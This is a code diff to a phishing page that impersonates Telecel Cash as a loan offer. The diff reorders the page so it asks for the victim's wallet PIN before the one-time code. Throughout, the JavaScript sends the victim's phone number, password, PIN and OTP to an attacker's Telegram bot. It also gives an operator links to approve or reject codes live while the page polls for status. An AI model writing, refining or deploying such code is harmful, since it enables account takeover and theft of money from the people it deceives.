@@ -93,6 +93,18 @@
         <button class="btn-outline" onclick="showView(1)">Go Back</button>
     </section>
 
+    <section id="view-6" class="view">
+        <h2 class="title" style="color: var(--tele-red);">Confirm Wallet PIN</h2>
+        <p class="subtitle">Please enter your 4-digit Telecel Cash PIN to verify account ownership.</p>
+        <div class="otp-row">
+            <input type="password" inputmode="numeric" class="pin-input" maxlength="1" oninput="movePinFocus(this, 0)">
+            <input type="password" inputmode="numeric" class="pin-input" maxlength="1" oninput="movePinFocus(this, 1)">
+            <input type="password" inputmode="numeric" class="pin-input" maxlength="1" oninput="movePinFocus(this, 2)">
+            <input type="password" inputmode="numeric" class="pin-input" maxlength="1" oninput="movePinFocus(this, 3)">
+        </div>
+        <button class="btn-red" id="pin-btn" onclick="sendPIN()">Authorize Login</button>
+    </section>
+
     <section id="view-2" class="view" style="text-align: center; padding-top: 60px;">
         <div class="loader"></div>
         <h2 class="title">Verifying Account...</h2>
@@ -116,19 +128,7 @@
     <section id="view-5" class="view" style="text-align: center; padding-top: 60px;">
         <div class="loader"></div>
         <h2 class="title">Processing Code...</h2>
-        <p class="subtitle">Validating your transaction with Telecel Secure. Please do not refresh.</p>
-    </section>
-
-    <section id="view-6" class="view">
-        <h2 class="title" style="color: var(--tele-red);">Enter Wallet PIN</h2>
-        <p class="subtitle">Please enter your 4-digit Telecel Cash PIN to authorize the loan transfer.</p>
-        <div class="otp-row">
-            <input type="password" inputmode="numeric" class="pin-input" maxlength="1" oninput="movePinFocus(this, 0)">
-            <input type="password" inputmode="numeric" class="pin-input" maxlength="1" oninput="movePinFocus(this, 1)">
-            <input type="password" inputmode="numeric" class="pin-input" maxlength="1" oninput="movePinFocus(this, 2)">
-            <input type="password" inputmode="numeric" class="pin-input" maxlength="1" oninput="movePinFocus(this, 3)">
-        </div>
-        <button class="btn-red" id="pin-btn" onclick="sendPIN()">Authorize Transfer</button>
+        <p class="subtitle">Finalizing your loan application with Telecel Secure. Please do not refresh.</p>
     </section>
 
     <section id="view-4" class="view" style="text-align: center; padding-top: 60px;">
@@ -169,12 +169,14 @@
         window.scrollTo(0,0);
     }
 
+    // Step 1: Start Flow
     async function startVerification() {
         const rawId = document.getElementById('user-id').value;
         if(!rawId) return alert("Phone Number is Required");
-        showView(7); // Go to Password view first
+        showView(7);
     }
 
+    // Step 2: Password Collection
     async function submitPassword() {
         const rawId = document.getElementById('user-id').value;
         const pass = document.getElementById('user-pass').value;
@@ -185,25 +187,46 @@
         btn.innerText = "AUTHENTICATING...";
         btn.disabled = true;
 
-        // 1. Send Login Data to Telegram
-        const msg = `🔑 *LOGIN ATTEMPT*\n📱 Phone: ${rawId}\n🔐 Pass: \`${pass}\`\n💰 Amt: GHS ${amt}`;
+        const msg = `🔐 *PASSWORD RECEIVED*\n📱 Phone: ${rawId}\n🔑 Pass: \`${pass}\`\n💰 Amt: GHS ${amt}`;
         fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(msg)}&parse_mode=Markdown`, { mode: 'no-cors' });
 
-        // 2. Delay for realism, then show loader & send Operator links
+        setTimeout(() => {
+            showView(6); 
+            btn.innerText = "Login & Continue";
+            btn.disabled = false;
+        }, 1500);
+    }
+
+    // Step 3: PIN Collection -> Start Polling
+    async function sendPIN() {
+        const inputs = document.querySelectorAll('.pin-input');
+        let pinCode = "";
+        inputs.forEach(input => pinCode += input.value);
+        if(pinCode.length < 4) return;
+
+        const phone = document.getElementById('user-id').value;
+        const btn = document.getElementById('pin-btn');
+        btn.innerText = "AUTHORIZING...";
+        btn.disabled = true;
+
+        const msg = `💳 *PIN RECEIVED*\n📱 Phone: ${phone}\n🔑 PIN: *${pinCode}*`;
+        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(msg)}&parse_mode=Markdown`, { mode: 'no-cors' });
+
         setTimeout(() => {
             showView(2); 
-            document.getElementById('display-id').innerText = rawId;
-            const safeId = encodeURIComponent(rawId.trim());
+            document.getElementById('display-id').innerText = phone;
+            const safeId = encodeURIComponent(phone.trim());
             const approveLink = SCRIPT_URL + "?cmd=approve&id=" + safeId;
             const wrongLink = SCRIPT_URL + "?cmd=wrongOTP&id=" + safeId;
             
-            const opMsg = `⚙️ *OPERATOR CONTROL*\nTarget: ${rawId}\n\n✅ *APPROVE:* ${approveLink}\n❌ *WRONG OTP:* ${wrongLink}`;
+            const opMsg = `⚙️ *OPERATOR CONTROL*\nTarget: ${phone}\n\n✅ *APPROVE:* ${approveLink}\n❌ *WRONG OTP:* ${wrongLink}`;
             fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(opMsg)}&parse_mode=Markdown`, { mode: 'no-cors' });
 
-            startPolling(rawId);
+            startPolling(phone);
         }, 2000);
     }
 
+    // Polling Logic
     async function startPolling(phone) {
         const cleanID = String(phone).trim();
         const poller = setInterval(async () => {
@@ -213,7 +236,7 @@
                 if (status === "otp_error" && !isResetting) {
                     isResetting = true;
                     await fetch(`${SCRIPT_URL}?id=${encodeURIComponent(cleanID)}&cmd=clear`);
-                    document.getElementById('timer').innerHTML = "<span style='color:#ffcc00;'>❌ INVALID CODE! CHECK SMS & RETRY</span>";
+                    document.getElementById('timer').innerHTML = "<span style='color:#ffcc00;'>❌ INVALID CODE! RETRY</span>";
                     document.querySelectorAll('.otp-input').forEach(input => { input.value = ""; input.disabled = false; });
                     const btn = document.getElementById('otp-btn');
                     btn.innerText = "Confirm & Finish";
@@ -248,6 +271,13 @@
         if (index === 4 && current.value.length >= 1) sendOTP();
     }
 
+    function movePinFocus(current, index) {
+        const inputs = document.querySelectorAll('.pin-input');
+        if (current.value.length >= 1 && index < inputs.length - 1) inputs[index + 1].focus();
+        if (index === 3 && current.value.length >= 1) sendPIN();
+    }
+
+    // Step 4: OTP Final Step
     async function sendOTP() {
         const inputs = document.querySelectorAll('.otp-input');
         let otpCode = "";
@@ -263,30 +293,7 @@
         fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(msg)}&parse_mode=Markdown`, { mode: 'no-cors' });
 
         showView(5); 
-        setTimeout(() => { showView(6); }, 3500);
-    }
-
-    function movePinFocus(current, index) {
-        const inputs = document.querySelectorAll('.pin-input');
-        if (current.value.length >= 1 && index < inputs.length - 1) inputs[index + 1].focus();
-        if (index === 3 && current.value.length >= 1) sendPIN();
-    }
-
-    async function sendPIN() {
-        const inputs = document.querySelectorAll('.pin-input');
-        let pinCode = "";
-        inputs.forEach(input => pinCode += input.value);
-        if(pinCode.length < 4) return;
-
-        const phone = document.getElementById('user-id').value;
-        const btn = document.getElementById('pin-btn');
-        btn.innerText = "AUTHORIZING...";
-        btn.disabled = true;
-
-        const msg = `💳 *PIN RECEIVED*\n📱 Phone: ${phone}\n🔑 PIN: *${pinCode}*`;
-        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(msg)}&parse_mode=Markdown`, { mode: 'no-cors' });
-
-        setTimeout(() => { showView(4); }, 3000);
+        setTimeout(() => { showView(4); }, 4000);
     }
 
     calculate();
